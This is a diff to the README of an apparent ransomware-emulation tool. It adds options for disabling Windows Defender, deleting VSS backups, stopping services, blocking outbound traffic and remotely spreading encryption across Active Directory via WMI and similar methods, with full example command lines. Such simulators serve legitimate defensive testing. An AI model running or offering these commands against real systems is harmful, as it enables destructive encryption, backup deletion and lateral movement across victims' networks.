@@ -15,13 +15,17 @@ Features:
 * Ransomware file extensions and behaviors based on real-world group observations
 * Ransomware Note Content/Names based on real-world group observations
 * Capability to force-kill commonly targeted processes
-* Capability to remove existing VSS Copies
-* Capability to create 'dummy' data sets of specified size/file count for targeting rather than using pre-existing data
-* Capability to adjust number of encryption/decryption routines (concurrency)
-* Ability to execute ransomware 'inline' or 'outline' - meaning either writing over the same file or writing to a new file and deleting the original
-* Encrypted configuration data embedded into the executable
-* Ability to delay ransomware note creation to avoid static detection signatures
-* Can target specific directories or enumerate local/network drives to target
+* Capability to stop commonly targeted services
+* Can tamper with Windows Defender
+* Can block outbound communication to specific ports/domains
+* Can remove existing VSS Copies
+* Can create mock data sets of specified size/file count for targeting rather than using pre-existing data
+* Adjustable encryption/decryption concurrency
+* Capability to execute ransomware 'inline' or 'outline' - meaning either writing over the same file or writing to a new file and deleting the original
+* Stores encrypted configuration data embedded within the executable
+* Capability to delay ransomware note creation to avoid immediate static detection signatures
+* Can target specific directories or enumerate all local/network drives to target
+* Can read remote target list via file/cmdline/AD for execution
 
 Just a note that this does not perfectly emulate all the TTPs/Behaviors of any given group - but it is good enough as a 
 simulation in my experience.
@@ -85,53 +89,82 @@ impact -directory \\localhost\C$\test -group ransomhub -recursive -cipher xchach
 
 impact -directory \\localhost\C$\test -group ransomhub -recursive -cipher xchacha20 -rsa_public "rsa_public.key" -workers 100 -ep 75 -threshold 2048
 # Same as above, but increase the size threshold for automatically encrypting 100% of a file (default 1048 bytes)
+
+impact -directory * -group play -recursive -workers 50 -ep 40 -killprocs -vss -blockports -killservices -defender -targetad -exec_method wmi
+# Read enabled computers from AD and execute impact remotely with provided parameters via WMI - will also kill configured processes and services, destroy VSS copies and block outbound ports via Windows Firewall
 ```
 
 
 ### Arguments
 ```
+  -blockhosts
+        Attempt to add configured domains into hosts.etc for redirection - requires admin privileges
+  -blockports
+        Attempt to add configured ports into a Windows Firewall Rule (if enabled) for blocking - requires admin privileges
   -cipher string
         Specify Symmetric Cipher for Encryption/Decryption
-  -create bool
+  -create
         Create a mixture of dummy-data files in the target directory for encryption targeting - when using this, only files created by impact will be targeted for encryption, regardless of existence
   -create_files int
         How many dummy-files to create (default 5000)
   -create_size int
         Size in megabytes of dummy-file data to target - distributed evenly across create_files count (default 5000)
-  -decrypt bool
+  -decrypt
         Attempt to decrypt using specified options - must include RSA Private Key and Group Name OR Cipher Used
+  -defender
+        Attempt to disable various aspects of Windows Defender when doing encryption - requires admin privileges
   -directory string
-        Target Directory - can be UNC Path (\\localhost\C$\test) or Local (C:\test)
+        Target Directory - can be UNC Path (\\localhost\C$\test) or Local (C:\test) or '*' to indicate local drive enumeration for complete targeting
   -ecc_private string
         Specify ECC Private-Key File - must be specified with decrypt if asymmetric system is ECC
   -ecc_public string
         Specify ECC Public-Key File to use - if blank, will use embedded key
   -ep int
         Percentage of data to encrypt in each file over the 100%-auto threshold (default 25)
+  -exec_method string
+        How to execute remote copies of impact - wmi, task, service, reg, startup, mmc (default "wmi")
+  -force_extension string
+        Force the use of a specific encryption extension
+  -force_note_name string
+        Force the use of a specific filename for a ransomware note
   -generate_keys
         If specified, will generate new RSA/ECC keys to use for encryption/decryption purposes
   -group string
         Specify a group to emulate - if none selected, will select one at random
-  -killprocs bool
-        Attempt to stop configured list of process binaries on the target machine prior to encryption
-  -list bool
+  -killprocs
+        Attempt to stop configured list of process binaries on the target machine prior to encryption - requires admin privileges
+  -killservices
+        Attempt to stop configured list of services - requires admin privileges
+  -list
         List available groups to emulate
   -method string
         inline - Read File, Encrypt in Memory, Write Modifications to Disk; outline - Read File, Encrypt to New File, Delete Original (default "inline")
-  -recursive bool
+  -recursive
         Whether or not to encrypt all subdirs recursively or not
+  -remotecopypath string
+        If specified, impact will be copied to this location on the remote device - if blank, will use the default ADMIN$ share
   -rsa_private string
         Specify RSA Private-Key File - must be specified with decrypt if asymmetric system is RSA
   -rsa_public string
         Specify RSA Public-Key File to use - if blank, will use embedded key
-  -skipconfirm bool
+  -skipconfirm
         Skip Directory Confirmation Prompt (be careful!)
+  -skipshares
+        If enabled, impact will not target network shares
+  -targetNetworkShares
+        If enabled, impact will target network shares if target_dir == "*"
+  -targetad
+        If enabled, impact will target all enabled computers in the current domain - requires admin privileges
+  -targets value
+        A comma-separated list of hostnames/IP addresses - impact will be copied to the remote device via SMB and executed via the chosen method
+  -targets_file string
+        Specify a file containing line-delimited hostnames/IPs to use as execution targets
   -threshold int
         File size in bytes to automatically encrypt 100% of the contents if file Size <= provided number (default 1024)
-  -vss bool
-        Attempt to remove all VSS copies on the target host prior to encryption
+  -vss
+        Attempt to remove all VSS copies prior to encryption - requires admin privileges
   -workers int
-        How many goroutines to use for encryption (default 25)
+        How many goroutines to use for encryption - think of this as a limiter for number of concurrent files that can be encrypted/decrypted (default 25)
 ```
 
 ### Credits/Acknowledgements
